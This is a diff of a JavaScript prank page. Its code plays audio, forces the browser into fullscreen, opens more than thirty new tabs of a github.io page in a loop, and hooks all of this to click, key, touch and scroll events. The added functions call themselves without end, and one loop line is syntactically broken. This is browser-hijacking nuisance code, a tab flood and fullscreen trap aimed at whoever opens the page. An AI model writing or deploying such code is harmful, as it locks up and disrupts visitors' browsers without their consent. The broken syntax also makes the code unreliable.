@@ -1,6 +1,16 @@
 let body = document.documentElement
+
+function caca(){
+  alert("CAACACAAA")
+  if (window.performance) {
+  console.info("window.performance works fine on this browser");
+}
+  caca()
+}
 function full(){
     body.requestFullscreen()
+    cactus()
+    full()
 }
 function cactus(){
     var audio = new Audio('out.mp3');
@@ -12,17 +22,18 @@ function cactus(){
     if (audio2.paused){
         audio2.play()
     }
-    for(let i=1; i<30; i++)
-    {
-     window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    for(let i=0; i <= 30; i++= {
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
     }
-    full()
+    cactus()
 }
+
 cactus()
-body.addEventListener("touchstart", cactus)
-body.addEventListener("keydown", cactus)
-body.addEventListener("scroll", cactus)
-body.addEventListener("mousedoown", cactus)
-body.addEventListener("DOMMouseScroll", cactus)
-body.addEventListener("mousewheel", cactus)
-body.addEventListener("click", cactus)
+full()
+body.addEventListener("touchstart", full)
+body.addEventListener("keydown", full)
+body.addEventListener("scroll", full)
+body.addEventListener("mousedoown", full)
+body.addEventListener("DOMMouseScroll", full)
+body.addEventListener("mousewheel", full)
+body.addEventListener("click", full)
